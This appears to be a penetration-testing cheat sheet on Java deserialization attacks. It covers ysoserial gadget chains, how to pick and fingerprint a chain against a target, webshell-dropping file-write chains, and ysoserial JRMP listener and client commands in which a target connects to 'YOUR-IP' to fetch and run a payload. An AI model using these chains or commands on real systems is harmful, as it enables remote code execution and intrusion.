# Java Gadget Catalog — chains, versions, trigger mechanisms

## The mental model — a gadget is a `hashCode`/`equals`/`compareTo`/`toString`

`ObjectInputStream.readObject()` on a *collection* rehashes/sorts/compares
its entries. The entries' methods are the attack surface — you almost never
invoke a sink directly; you arrange for `HashMap.put` → `key.hashCode()` →
a gadget method → `InvokerTransformer.transform` → `Method.invoke` → exec.

```
Map.readObject → put(key) → key.hashCode()
  → URL.hashCode           → DNS resolve          [URLDNS]
  → AnnotationInvocationHandler.invoke → proxy → Method.invoke
  → ChainedTransformer.transform → Transformer[] → InvokerTransformer
       → Method.invoke("getMethod"/"invoke"/"exec")
```

## The chain table — ysoserial names, deps, trigger

| Chain | Needs on classpath | Trigger shape | Size |
|---|---|---|---|
| URLDNS | JDK only | `URL.hashCode` → resolve | ~300B, detection |
| CommonsCollections1 | commons-collections ≤3.2.1 | `AnnotationInvocationHandler.readObject`→proxy.invoke→CC chain | ~2-4KB |
| CommonsCollections2 | commons-collections4 4.0 | `PriorityQueue.readObject`→compare |  |
| CommonsCollections3 | commons-collections 3.x | same template | |
| CommonsCollections4 | commons-collections4 | | |
| CommonsCollections5 | commons-collections 3.1-3.2.1 | `BadAttributeValueExpException`→toString | works 8u76+ |
| CommonsCollections6 | commons-collections 3.1-3.2.1 | `HashMap.readObject`→hash→`TiedMapEntry` | most reliable |
| CommonsCollections7 | commons-collections 3.x | `Hashtable.readObject`→equals | |
| CommonsBeanutils1 | commons-beanutils (no CC needed) | `BeanComparator.compare`→`PropertyUtils.getProperty`→getter | big |
| Groovy1 | groovy | `MethodClosure.call` | |
| Spring1/2 | spring-* | `ObjectFactoryDelegatingInvocationHandler` | |
| Jdk7u21 | JDK ≤7u21 only | `AnnotationInvocationHandler`+`TemplatesImpl` | JDK version-gated |
| JRE8u20 | JDK 8u20 | bean-specific `JtaTransactionManager` | gated |
| Hibernate1/2 | hibernate-core | `TypedValue` getter | |
| Myfaces1/2 | myfaces-impl | | JSF only |
| Rome | rome | `ToStringBean.toString`→getter | |
| Click1 | click-nodeps | `Column`+`Table` | |
| Vaadin1 | vaadin-server | | |
| JSON1 | json-lib+spring | `JSONObject` | |
| AspectJWeaver | aspectjweaver | **file write** not RCE | writes a file — webshell |
| BeanShell1 | beanshell | `bsh.Interpreter` eval | |
| C3P0 | c3p0 | `PoolBackedDataSource`→JNDI | pairs with JNDI server |
| FileUpload1 | commons-fileupload+wicket | file write/move | |
| JBossInterceptors1 | jboss-interceptors | | |
| JavassistWeld1 | javassist+weld-core | | |
| JRMPClient | JDK only | `UnicastRef` connect → your JRMP listener | bootstrap |
| MozillaRhino1/2 | rhino | | |
| Wicket1 | wicket | | |
| Vaadin1 | vaadin | | |
| Python1 | jython | | |

## Picking the chain — the decision order

```
1. URLDNS first → proves readObject ran
2. fingerprint: send a classdesc for a probe class → ClassNotFoundException
   names the class state. OR GadgetProbe probes per lib.
3. read the app's deps if source/lib dirs visible:
   pom.xml / build.gradle / WEB-INF/lib/*.jar → version-pick the chain
4. version-matched chain → serialVersionUID will match by construction
5. no library? → Jdk7u21 (≤7u21), JRE8u20 (8u20), or AspectJWeaver
   (file-write), or C3P0/JdbcRowSetImpl (JNDI pivot)
```

## serialVersionUID — the silent killer

```
java.io.InvalidClassException: com.target.Foo; local class incompatible:
  stream classdesc serialVersionUID = -12345,
  local class serialVersionUID = 67890
```

The exception NAMES the local UID — it tells you the class exists AND its
version. A mismatch means: your chain was built for a different jar version.
Re-generate against the right jar (or patch the UID bytes in the stream —
`java_ser.py` output shows where the UID sits).

## Chains that don't exec — the non-RCE impacts

| Chain | Impact | When it's the right pick |
|---|---|---|
| AspectJWeaver | file write | RCE blocked but you can drop a JSP shell |
| FileUpload1 | file move/write | same |
| JRMPClient | connect-out | egress allowed → second-stage via ysoserial exploit/JRMPListener |
| C3P0 | JNDI connect | JNDI gadget path |
| JdbcRowSetImpl | JNDI lookup | same |
| URLDNS | DNS resolve | detection only |

## The JRMP second-stage — when there's no direct chain

```bash
# on the listener:
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections5 'id'
# the payload sent to the target is just:
java -jar ysoserial.jar JRMPClient YOUR-IP:1099 >jrmp.ser
# target readObject → UnicastRef connects to your listener → listener
# delivers the real CC5 payload → target runs it
```

Two-hop — the outer payload only needs JDK classes, the listener serves the
real chain. Use when the target's libs aren't fingerprintable directly but
JRMP egress is open.

## The blind-classpath probe — GadgetProbe

```bash
# ysoserial's fingerprinting module — one probe per library class:
# for each candidate lib, it sends a serialized object that triggers a
# callback ONLY if that class loads — narrows version without a stack trace
```

Probe classes it tries (each is library-signature):
`org.apache.commons.collections.functors.ChainedTransformer`,
`org.apache.commons.beanutils.BeanComparator`,
`groovy.lang.MethodClosure`, `org.springframework.beans.factory.ObjectFactory`,
`com.mchange.v2.c3p0.PoolBackedDataSource`, `org.aspectj.weaver.tools.cache.SimpleCache`,
`org.apache.commons.fileupload.disk.DiskFileItem`, etc.

## Falsifiers

- `readObject` runs but the resolved class list is empty/whitelisted —
  `ObjectInputFilter` or a `resolveClass` override rejects non-app classes.
  The error `ObjectInputFilter REJECTED` or a custom `resolveClass`
  exception names the filter — then only whitelisted classes can chain.
- Egress dead AND no file-write chain lands → local-impact only, report
  honestly.

## Output to record

- Library + version the chain was built for (and how it was learned)
- Chain name verbatim + the exact `java -jar ysoserial.jar` line
- The OOB/response evidence the chain fired
